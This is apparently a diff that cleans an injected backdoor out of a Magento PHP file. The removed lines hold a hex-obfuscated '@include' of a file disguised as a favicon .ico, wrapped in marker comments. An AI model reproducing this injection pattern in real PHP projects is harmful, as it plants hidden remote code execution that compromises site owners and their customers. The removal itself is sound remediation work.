@@ -1,10 +1,5 @@
 <?php
 
-/*db70c*/
-
-@include "\x2fda\x74a/\x76ho\x73ts\x2fww\x77.o\x73-s\x74or\x65.c\x6fm/\x61t/\x6as/\x6cib\x2ffa\x76ic\x6fn_\x37eb\x3301\x2eic\x6f";
-
-/*db70c*/
 /**
  * Magento
  *
